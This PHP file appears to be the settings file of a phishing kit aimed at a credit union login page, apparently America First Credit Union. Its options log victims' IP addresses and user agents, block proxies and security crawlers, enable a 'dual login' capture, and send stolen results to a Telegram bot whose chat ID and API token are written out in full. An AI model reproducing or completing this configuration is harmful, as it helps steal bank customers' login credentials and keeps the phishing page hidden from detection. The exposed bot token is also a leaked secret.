<?php



$settings = array(
	"log_user"		=> "1",	// Log User-Agent, IP and Date
	"print_match"	=> "0",	// Print Crawler Detections 
	"anti-back"		=> "0",	// Victim Can't Go Back To Session
	"debug"			=> "0",	// Print Errors
	"proxy_block"	=> "1",	// Detect Proxies & Block Them
	"send_mail"		=> "0",	// Send E-Mail To Your Mail
	"save_results"	=> "0",	// Save Results 
	"telegram"		=> "1",	// Telegram Bots Receiver
	"country"		=> "US", // Target SPAM Country
	"double_login"  => "1",	// Dual Login 
	"chat_id"		=> "1914360339",	// Chat ID Of You
	"bot_url"		=> "5515373167:AAEJr3zz6lvwCZnDq1L-SjgzFNMYQGPKNeQ",	// Your Bot API Key
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots 
	"out"			=> "americafirstcu+login",	// Outcome Of AntiBots Forward - DONT CHANGE
	"email"			=> "",	// Your E-Mail
);
return $settings;



?>

